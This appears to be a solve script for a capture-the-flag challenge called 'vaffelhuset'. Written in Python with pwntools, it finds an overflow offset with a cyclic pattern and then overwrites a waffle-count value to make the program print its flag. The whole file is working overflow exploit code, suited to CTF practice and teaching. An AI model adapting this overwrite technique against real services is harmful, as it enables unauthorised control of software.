from pwn import *

local = True
challbin = "./vaffelhuset"
challhost = ""

if local:
	p = process(challbin)
else:
	p = remote(challhost, 31313)

# find offsets
# age
p.sendline("23".encode())
# name
p.sendline("namn".encode())
# cyclic offset
p.sendline(cyclic(50))
# statistics
p.sendline("2".encode())
p.readuntil("Våfflor: ".encode())
cyclic_antal = p.readline().strip()
offset = cyclic_find(p64(int(cyclic_antal.decode())))
p.close()

print(f"offset = {offset}")

# Hack it!
if local:
	p = process(challbin)
else:
	p = remote(challhost, 31313)
prologue = p.recvuntil("göra\n".encode("utf8"))
print(prologue.decode())
line = p.recvline()
print(line.decode())
antal = line.decode("utf8").strip().split(" ")[1]
print(f"to do: {antal} våfflor")
packed_antal = p64(int(antal))
p.sendline("23".encode())
p.sendline("namn".encode())
payload = "A".encode() * offset + packed_antal
print(f"payload: {payload}")
p.sendline(payload)

#p.interactive()
# get statistics
p.sendline("2".encode())
p.readuntil("SSM{".encode())
flagga = p.readline().decode()
print("SSM{" + flagga)
p.close()

